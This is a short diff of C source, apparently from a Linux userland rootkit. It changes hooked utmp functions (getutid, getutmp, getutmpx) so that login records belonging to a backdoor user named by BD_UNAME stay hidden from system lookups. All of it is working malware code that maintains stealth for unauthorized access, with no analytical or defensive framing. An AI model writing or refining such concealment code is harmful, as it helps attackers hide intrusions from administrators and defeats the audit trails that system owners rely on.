@@ -16,7 +16,6 @@ struct utmp *getutid(const struct utmp *ut){
 
     do{
         tmp = call(CGETUTID, ut);
-        if(is_bdusr()) return tmp;
         if(tmp == NULL) continue;
     }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
 
@@ -94,6 +93,7 @@ void getutmp(const struct utmpx *ux, struct utmp *u){
     if(ux && ux->ut_user != NULL){
         if(!strncmp(BD_UNAME, ux->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
+            return;
         }
     }
 
@@ -107,6 +107,7 @@ void getutmpx(const struct utmp *u, struct utmpx *ux){
     if(u && u->ut_user != NULL){
         if(!strncmp(BD_UNAME, u->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
+            return;
         }
     }
 
